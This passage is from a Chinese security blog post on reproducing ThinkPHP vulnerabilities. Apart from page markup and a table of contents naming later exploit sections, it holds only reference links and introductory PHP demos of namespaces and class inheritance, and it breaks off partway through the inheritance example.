
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>ThinkPHP漏洞复现 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%92%8C%E5%AD%90%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-number">2.1.</span> <span class="toc-text">命名空间和子命名空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E7%9A%84%E7%BB%A7%E6%89%BF"><span class="toc-number">2.2.</span> <span class="toc-text">类的继承</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#trait%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">2.3.</span> <span class="toc-text">trait修饰符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP%E5%BC%80%E5%8F%91%E6%89%8B%E5%86%8C"><span class="toc-number">3.</span> <span class="toc-text">ThinkPHP开发手册</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%8C%96%E8%AE%BE%E8%AE%A1"><span class="toc-number">3.1.</span> <span class="toc-text">模块化设计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">常用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%EF%BC%885-0%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">目录结构（5.0）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE"><span class="toc-number">3.4.</span> <span class="toc-text">配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD"><span class="toc-number">3.4.1.</span> <span class="toc-text">配置加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E9%85%8D%E7%BD%AE"><span class="toc-number">3.4.2.</span> <span class="toc-text">读取配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E9%85%8D%E7%BD%AE"><span class="toc-number">3.4.3.</span> <span class="toc-text">扩展配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E5%BC%95%E5%AF%BCstart-php"><span class="toc-number">3.5.</span> <span class="toc-text">框架引导start.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%90%AF%E5%8A%A8App-run"><span class="toc-number">3.6.</span> <span class="toc-text">应用启动App::run()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E6%A3%80%E6%9F%A5self-routeCheck"><span class="toc-number">3.7.</span> <span class="toc-text">路由检查self::routeCheck()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E8%B0%83%E5%BA%A6App-exec"><span class="toc-number">3.8.</span> <span class="toc-text">应用调度App::exec()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%84%E7%90%86Request%E7%B1%BB"><span class="toc-number">3.9.</span> <span class="toc-text">请求处理Request类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%86%E5%9B%BE%E6%B8%B2%E6%9F%93View-php"><span class="toc-number">3.10.</span> <span class="toc-text">视图渲染View.php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL%E8%AE%BF%E9%97%AE"><span class="toc-number">3.11.</span> <span class="toc-text">URL访问</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP3"><span class="toc-number">4.</span> <span class="toc-text">ThinkPHP3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">4.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE"><span class="toc-number">4.1.1.</span> <span class="toc-text">数据库配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-3where%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">3.2.3where注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">4.2.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.2.3.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">exp注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">4.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">4.3.3.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-3bind%E6%B3%A8%E5%85%A5"><span class="toc-number">4.4.</span> <span class="toc-text">3.2.3bind注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-2"><span class="toc-number">4.4.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.4.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%90"><span class="toc-number">4.5.</span> <span class="toc-text">3.2.3反序列化链子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">4.5.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-3"><span class="toc-number">4.5.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP5"><span class="toc-number">5.</span> <span class="toc-text">ThinkPHP5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-payload%E6%80%BB%E7%BB%93"><span class="toc-number">5.1.</span> <span class="toc-text">RCE payload总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="toc-number">5.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce"><span class="toc-number">5.3.</span> <span class="toc-text">method任意调用方法导致rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-4"><span class="toc-number">5.3.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">5.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#debug%E7%9B%B8%E5%85%B3"><span class="toc-number">5.3.3.</span> <span class="toc-text">debug相关</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E5%BC%80%E5%90%AF%E5%BC%BA%E5%88%B6%E8%B7%AF%E7%94%B1%E5%AF%BC%E8%87%B4rce"><span class="toc-number">5.4.</span> <span class="toc-text">未开启强制路由导致rce</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-2"><span class="toc-number">5.4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-5"><span class="toc-number">5.4.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-5"><span class="toc-number">5.4.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">5.4.4.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">5.5.</span> <span class="toc-text">5.0.x反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">5.5.1.</span> <span class="toc-text">poc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE"><span class="toc-number">5.6.</span> <span class="toc-text">5.1.x反序列化ajax链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-3"><span class="toc-number">5.6.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-1"><span class="toc-number">5.6.2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-6"><span class="toc-number">5.6.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="toc-number">5.6.4.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tp-lt-x3D-5-0-10-%E7%BC%93%E5%AD%98getshell"><span class="toc-number">5.7.</span> <span class="toc-text">tp&lt;&#x3D;5.0.10 缓存getshell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP6"><span class="toc-number">6.</span> <span class="toc-text">ThinkPHP6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-4"><span class="toc-number">6.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-0-1-6-0-3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96withAttr%E9%93%BE"><span class="toc-number">6.2.</span> <span class="toc-text">6.0.1-6.0.3反序列化withAttr链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-5"><span class="toc-number">6.2.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-2"><span class="toc-number">6.2.2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-7"><span class="toc-number">6.2.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%9C%80%E5%90%8E-getData-%E5%92%8C-getRealFieldName-%E7%9A%84%E8%A1%A5%E5%85%85"><span class="toc-number">6.2.4.</span> <span class="toc-text">关于最后 getData 和 getRealFieldName 的补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-0-9%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.3.</span> <span class="toc-text">6.0.9反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-0-12%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.4.</span> <span class="toc-text">6.0.12反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-6"><span class="toc-number">6.4.1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc-3"><span class="toc-number">6.4.2.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-8"><span class="toc-number">6.4.3.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-0-13%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88CVE-2022-38352%EF%BC%89"><span class="toc-number">6.5.</span> <span class="toc-text">6.0.13反序列化（CVE-2022-38352）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ThinkPHP8"><span class="toc-number">7.</span> <span class="toc-text">ThinkPHP8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc-4"><span class="toc-number">7.1.</span> <span class="toc-text">poc</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>ThinkPHP漏洞复现</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/10/24
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/CMS/" style="color: #ff7d73">CMS</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">12.5k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">58分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp5-source-read/">https://y4er.com/posts/thinkphp5-source-read/</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp3-vuln/">https://y4er.com/posts/thinkphp3-vuln/</a></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/thinkphp5-rce">https://y4er.com/posts/thinkphp5-rce</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/329045.html">https://www.freebuf.com/articles/web/329045.html</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123237118">https://blog.csdn.net/weixin_45794666/article/details/123237118</a></p>
<span id="more"></span>

<hr>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="命名空间和子命名空间"><a href="#命名空间和子命名空间" class="headerlink" title="命名空间和子命名空间"></a>命名空间和子命名空间</h2><p>了解c++的应该都知道namespace的概念</p>
<p>我们可以把namespace理解为一个单独的空间，而子命名空间就是这个空间里再划分几个小空间</p>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">animal<span class="token punctuation">\</span>cat</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">cat</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"meow"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">animal<span class="token punctuation">\</span>dogA</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"A:wooffff"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">animal<span class="token punctuation">\</span>dogB</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">dog</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"B:wooffff"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">new</span> <span class="token class-name">dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//下面输出的都是dogA</span>
<span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>animal<span class="token punctuation">\</span>dogA<span class="token punctuation">\</span>dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">animal<span class="token punctuation">\</span>dogA</span><span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">dogA<span class="token punctuation">\</span>dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">animal<span class="token punctuation">\</span>dogA</span> <span class="token keyword">as</span> alias<span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">alias<span class="token punctuation">\</span>dog</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//输出cat</span>
<span class="token keyword">use</span> <span class="token package">animal<span class="token punctuation">\</span>cat<span class="token punctuation">\</span>cat</span><span class="token punctuation">;</span>
<span class="token keyword">new</span> <span class="token class-name">cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/24/ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20231108204244808.png" alt="image-20231108204244808"></p>
<p>animal在这里就是我们的命名空间，而<code>animal\cat</code> ，<code>animal\dogA</code>，<code>animal\dogB</code>都是其子命名空间，可以看到这样一共就存在三个命名空间，而使用各个命名空间的方法就是将命名空间的名字写完整，注：命名空间支持跨文件调用</p>
<p>要实例化命名空间中的类有两种方法：一种是实例化时直接指定对应命名空间下的类，如<code>new \animal\dogA\dog()</code>和<code>new dogA\dog()</code>；另一种是在namespace下直接实例化，在上面的demo中，直接进行实例化<code>new dog()</code>时的命名空间是最后的<code>namespace animal\dogB</code></p>
<p><code>use</code>在这里和include、require有点像，就是在<strong>当前命名空间引入其他命名空间的别名</strong>，比如<code>use animal\dogA as alias</code>其中的alias就是animal的别名，然后我们就可以用这个别名来调用</p>
<p><code>use animal\cat\cat</code>这句话就是直接指定了animal\cat命名空间的cat类了，我们只需要直接new就可以创建cat对象，不需要在前面加命名空间</p>
<p>所以当我们在拉反序列化链子的时候 ，除了<code>namespace</code>当前类的命名空间，还要<code>use</code>下一个类的<code>命名空间 + \类名</code></p>
<hr>
<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><p>PHP类的继承是通过<code>extend</code>关键字来实现的，和java是一样的</p>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">father</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string double-quoted-string">"Sensei"</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$hobby</span><span class="token operator">=</span><span class="token string double-quoted-string">"game"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"i am father \n"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
